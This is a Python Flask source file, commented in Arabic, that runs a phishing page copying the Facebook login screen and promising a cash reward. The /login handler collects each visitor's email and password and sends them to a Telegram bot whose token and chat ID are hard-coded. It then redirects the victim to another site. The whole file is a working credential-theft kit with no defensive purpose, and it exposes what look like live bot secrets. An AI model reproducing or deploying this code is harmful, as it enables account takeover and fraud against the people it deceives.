import os
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# --- بياناتك المأكدة 100% ---
# توكن البوت الجديد: Fares Hunter V2
BOT_TOKEN = "8416648663:AAHP3pqJAMOcNGG5LY6hqOwikiiPxiXuRlA" 
# الأيدي الخاص بك: userinfobot
CHAT_ID = "7479786207"
# الموقع اللي يروح ليه الضحية بعد التسجيل
REDIRECT_URL = "https://trianglerockers.com/1885419"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 38px; font-weight: bold; margin-bottom: 15px; }
        .msg { font-size: 16px; color: #1c1e21; margin-bottom: 20px; font-weight: 500; }
        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; background-color: #f5f6f7; }
        button { width: 98%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .footer-line { border-top: 1px solid #dddfe2; margin: 20px 0; }
        .create-btn { background: #42b72a; color: white; padding: 10px 16px; border-radius: 6px; text-decoration: none; font-weight: bold; display: inline-block; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="fb-logo">facebook</div>
        <div class="msg">سجل دخولك لتأكيد هويتك واستلام مكافأة 1800 دج فوراً</div>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="pass" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer-line"></div>
        <a href="#" class="create-btn">إنشاء حساب جديد</a>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/login', methods=['POST'])
def login():
    # استخراج المعلومات من الفورم
    u_email = request.form.get('email')
    u_pass = request.form.get('pass')
    
    # رسالة الصيدة
    msg_text = f"🔥 صيدة جديدة يا فارس! 🦾\n\n📧 الإيميل: {u_email}\n🔑 الباسورد: {u_pass}"
    
    # إرسال للتلغرام باستعمال التوكن والأيدي المأكدين
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": msg_text}
    
    try:
        requests.post(telegram_url, data=payload)
    except Exception as e:
        print(f"Error sending to telegram: {e}")

    # تحويل الضحية للموقع الحقيقي
    return redirect(REDIRECT_URL)

if __name__ == '__main__':
    # تشغيل السيرفر على البورت اللي يحتاجو Render
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
